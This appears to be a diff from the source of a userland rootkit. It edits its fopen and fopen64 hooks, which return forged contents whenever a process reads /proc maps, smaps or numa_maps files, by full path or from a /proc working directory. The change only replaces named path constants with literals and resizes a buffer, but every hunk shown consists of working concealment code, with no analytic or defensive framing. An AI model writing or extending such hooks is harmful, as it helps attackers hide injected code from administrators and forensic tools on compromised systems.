@@ -17,15 +17,15 @@ FILE *fopen(const char *pathname, const char *mode){
     if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
     if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
 
-    char cwd[PATH_MAX];
+    char cwd[PROCPATH_MAXLEN];
     if(getcwd(cwd, sizeof(cwd)) != NULL){
-        if(!strcmp(cwd, PROC_PATH)){
+        if(!strcmp(cwd, "/proc")){
             if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
             if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
             if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
         }
 
-        if(!fnmatch(PROC_ALL_PATH, cwd, FNM_PATHNAME)){
+        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
             if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_maps(pathname);
             if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
             if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
@@ -57,15 +57,15 @@ FILE *fopen64(const char *pathname, const char *mode){
     if(!fnmatch(SMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
     if(!fnmatch(NMAPS_FULL_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
 
-    char cwd[PATH_MAX];
+    char cwd[PROCPATH_MAXLEN];
     if(getcwd(cwd, sizeof(cwd)) != NULL){
-        if(!strcmp(cwd, PROC_PATH)){
+        if(!strcmp(cwd, "/proc")){
             if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
             if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
             if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
         }
 
-        if(!fnmatch(PROC_ALL_PATH, cwd, FNM_PATHNAME)){
+        if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)){
             if(!fnmatch(MAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_maps(pathname);
             if(!fnmatch(SMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
             if(!fnmatch(NMAPS_FILENAME, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
